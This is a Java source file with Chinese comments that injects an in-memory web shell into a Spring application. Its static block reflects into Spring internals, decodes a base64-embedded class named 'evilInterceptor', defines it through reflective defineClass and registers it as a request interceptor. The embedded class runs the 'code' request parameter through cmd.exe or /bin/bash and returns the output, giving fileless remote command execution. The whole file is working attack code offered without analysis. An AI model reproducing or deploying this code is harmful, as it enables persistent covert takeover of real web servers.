import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletContext;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;


public class InterceptorShell {
    static {
        // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
        java.lang.reflect.Field filed = null;
        try {
            filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
// 2. 属性被 private 修饰，所以 setAccessible true
        filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
        org.springframework.web.context.WebApplicationContext context = null;
        try {
            context = (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(null)).iterator().next();
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = null;
        try {
            field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = null;
        try {
            adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        String className = "evilInterceptor";
        String b64 = "yv66vgAAADQAmQoAIgBTCAA9CwBUAFULAFYAVwgAWAoAWQBaCgALAFsIAFwKAAsAXQcAXgcAXwgAYAgAYQoACgBiCQBZAGMKAGQAZQgAZggAZwoACgBoCgAKAGkHAGoHAGsKAGwAbQoAFgBuCgAVAG8KABUAcAoAcQBlCgBxAHIKAHEAcwcAdAsAIwB1CwAjAHYHAHcHAHgHAHkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEUxldmlsSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQABcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAF8HAHoHAF4HAHcHAHsHAHwHAHgHAHQBAApFeGNlcHRpb25zAQAQTWV0aG9kUGFyYW1ldGVycwEACnBvc3RIYW5kbGUBAJIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzspVgEADG1vZGVsQW5kVmlldwEALkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzsBAA9hZnRlckNvbXBsZXRpb24BAHkoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvRXhjZXB0aW9uOylWAQACZXgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQAUZXZpbEludGVyY2VwdG9yLmphdmEMACQAJQcAewwAfQB+BwB8DAB/AIABAAdvcy5uYW1lBwCBDACCAH4MAIMAhAEAA3dpbgwAhQCGAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAJACHDACIAIkHAIoMAIsAjAEACS9iaW4vYmFzaAEAAi1jDACNAI4MAI8AkAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCRDACSAJMMACQAlAwAJACVDACWAIQHAHoMAJcAJQwAmAAlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwASQBKDABNAE4BAA9ldmlsSW50ZXJjZXB0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAFZmx1c2gBAAVjbG9zZQAhACEAIgABACMAAAAEAAEAJAAlAAEAJgAAAC8AAQABAAAABSq3AAGxAAAAAgAnAAAABgABAAAACQAoAAAADAABAAAABQApACoAAAABACsALAADACYAAAHGAAYACgAAALYrEgK5AAMCADoEGQTGAKgsuQAEAQA6BRIFuAAGtgAHEgi2AAmZACK7AApZBr0AC1kDEgxTWQQSDVNZBRkEU7cADjoGpwAnsgAPGQS2ABC7AApZBr0AC1kDEhFTWQQSElNZBRkEU7cADjoGGQYEtgATVxkGtgAUOge7ABVZuwAWWRkHtgAXtwAYtwAZOggZCLYAGjoJsgAPGQm2ABAZBRkJtgAbGQW2ABwZBbYAHacABToFA6wErAABAA8ArQCwAB4AAwAnAAAATgATAAAADAAKAA0ADwAPABcAEQAnABIARgAUAE4AFQBqABcAcQAYAHgAGQCNABoAlAAbAJwAHACjAB0AqAAeAK0AIACwAB8AsgAhALQAIwAoAAAAcAALAEMAAwAtAC4ABgAXAJYALwAwAAUAagBDAC0ALgAGAHgANQAxADIABwCNACAAMwA0AAgAlAAZADUANgAJAAAAtgApACoAAAAAALYANwA4AAEAAAC2ADkAOgACAAAAtgA7ADwAAwAKAKwAPQA2AAQAPgAAACwABf0ARgcAPwcAQPwAIwcAQf8ARQAFBwBCBwBDBwBEBwBFBwA/AAEHAEYBAQBHAAAABAABAB4ASAAAAA0DADcAAAA5AAAAOwAAAAEASQBKAAMAJgAAAGAABQAFAAAACiorLC0ZBLcAH7EAAAACACcAAAAKAAIAAAAoAAkAKQAoAAAANAAFAAAACgApACoAAAAAAAoANwA4AAEAAAAKADkAOgACAAAACgA7ADwAAwAAAAoASwBMAAQARwAAAAQAAQAeAEgAAAARBAA3AAAAOQAAADsAAABLAAAAAQBNAE4AAwAmAAAAYAAFAAUAAAAKKissLRkEtwAgsQAAAAIAJwAAAAoAAgAAAC0ACQAuACgAAAA0AAUAAAAKACkAKgAAAAAACgA3ADgAAQAAAAoAOQA6AAIAAAAKADsAPAADAAAACgBPAFAABABHAAAABAABAB4ASAAAABEEADcAAAA5AAAAOwAAAE8AAAABAFEAAAACAFI="; // magicInterceptor 类 class 的 base64 编码
        byte[] bytes = null;
        try {
            bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className);
        }catch (ClassNotFoundException e){
            java.lang.reflect.Method m0 = null;
            try {
                m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                throw new RuntimeException(ex);
            }
            m0.setAccessible(true);
            try {
                m0.invoke(classLoader, className, bytes, 0, bytes.length);
            } catch (IllegalAccessException ex) {
                throw new RuntimeException(ex);
            } catch (InvocationTargetException ex) {
                throw new RuntimeException(ex);
            }
            try {
                adaptedInterceptors.add(classLoader.loadClass("evilInterceptor").newInstance());
            } catch (InstantiationException ex) {
                throw new RuntimeException(ex);
            } catch (IllegalAccessException ex) {
                throw new RuntimeException(ex);
            } catch (ClassNotFoundException ex) {
                throw new RuntimeException(ex);
            }
        }
    }
}
